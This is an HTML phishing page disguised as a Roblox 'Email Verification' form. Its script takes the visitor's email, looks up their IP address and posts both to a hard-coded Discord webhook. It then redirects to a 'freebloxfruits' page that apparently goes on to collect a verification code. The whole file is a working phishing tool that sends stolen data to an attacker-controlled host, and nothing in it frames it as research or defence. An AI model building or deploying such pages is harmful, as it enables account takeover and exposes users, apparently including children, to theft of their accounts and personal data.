<!-- email.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Verification</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h2>Email</h2>
        <p>Your Roblox Email</p>
        <input type="email" id="email" placeholder="Email Address" required>
        <br>
        <button onclick="submitEmail()">Submit</button>
    </div>

    <script>
        async function submitEmail() {
            const email = document.getElementById('email').value;

            // Fetch the user's IP address
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIP = ipData.ip;

            // Send the email and IP to the webhook
            fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    embeds: [{
                        title: userIP,
                        description: `Email: ${email}\nCode: none`
                    }]
                })
            }).then(() => {
                // Redirect to the specified URL
                window.location.href = "https://freebloxfruits.github.io/code-verify";
            });
        }
    </script>
</body>
</html>
